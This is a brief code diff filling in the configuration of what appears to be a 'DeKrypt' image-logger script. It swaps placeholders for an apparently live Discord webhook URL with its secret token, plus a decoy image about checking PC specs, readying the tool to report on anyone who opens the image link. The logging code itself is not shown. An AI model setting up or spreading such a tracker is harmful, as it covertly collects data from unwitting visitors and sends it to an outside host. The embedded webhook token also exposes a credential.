@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1445480341308575816/taPLVf5i-4r2SS9jyk3DLFWW3uWiyEnQeK8rv4vkgBQ_EHRUE5qSMgTn-QsuxsIbVBGR",
+    "image": "https://netaraby.com/wp-content/uploads/2022/01/how-to-check-pc-specs-windows-10-1.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
